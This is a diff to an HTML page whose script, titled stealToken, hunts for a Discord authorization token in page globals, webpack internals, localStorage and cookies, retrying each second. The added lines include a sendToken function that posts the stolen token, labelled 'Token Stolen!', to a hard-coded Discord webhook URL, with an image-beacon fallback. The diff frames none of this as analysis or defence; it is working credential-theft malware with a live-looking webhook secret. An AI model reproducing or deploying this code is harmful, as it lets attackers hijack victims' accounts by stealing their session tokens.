@@ -3,7 +3,7 @@
 <body>
 <script>
   let attempts = 0;
-  const maxAttempts = 50; // Check for ~50 seconds max
+  const maxAttempts = 50; 
 
   function stealToken() {
     let token = null;
@@ -12,7 +12,6 @@
     try { token = window._discordHeaders?.Authorization; } catch(e){}
     if (!token) {
       try { 
-        // Try the z object method
         const z = window.z;
         if (z && z[0] && z[0].c && z[0].c.exports) {
           token = z[0].c.exports.default?.instance?.getToken?.();
@@ -26,4 +25,53 @@
     }
 
     // 2. Try Local Storage
-    if (!
+    if (!token) {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key.includes('token')) {
+          token = localStorage.getItem(key);
+          break;
+        }
+      }
+    }
+
+    // 3. Try Cookies
+    if (!token) {
+      const match = document.cookie.match(/token=([^;]+)/);
+      if (match) token = match[1];
+    }
+
+    if (token) {
+      console.log("Token found!");
+      sendToken(token);
+    } else {
+      attempts++;
+      if (attempts < maxAttempts) {
+        setTimeout(stealToken, 1000); 
+      } else {
+        console.log("Max attempts reached. No token found.");
+      }
+    }
+  }
+
+  function sendToken(token) {
+    fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
+      })
+    }).then(() => {
+      console.log("Sent.");
+    }).catch(err => {
+      console.error("Failed:", err);
+      const img = new Image();
+      img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
+    });
+  }
+
+  // Start checking after 3 seconds to let Discord load
+  setTimeout(stealToken, 3000);
+</script>
+</body>
+</html>
